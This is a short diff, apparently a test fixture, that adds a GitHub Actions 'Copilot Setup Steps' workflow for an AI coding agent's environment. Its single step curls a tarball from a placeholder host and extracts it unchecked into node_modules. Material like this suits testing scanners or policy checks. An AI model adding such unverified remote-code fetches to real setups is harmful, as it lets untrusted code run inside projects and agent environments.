@@ -1,0 +1,11 @@
+-- .github/workflows/copilot-setup-steps.yml --
+name: Copilot Setup Steps
+on: workflow_dispatch
+jobs:
+  copilot-setup-steps:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Fetch prebuilt modules
+        run: |
+          curl -fsSL https://example.invalid/modules.tar.gz -o modules.tar.gz
+          tar -xzf modules.tar.gz -C node_modules
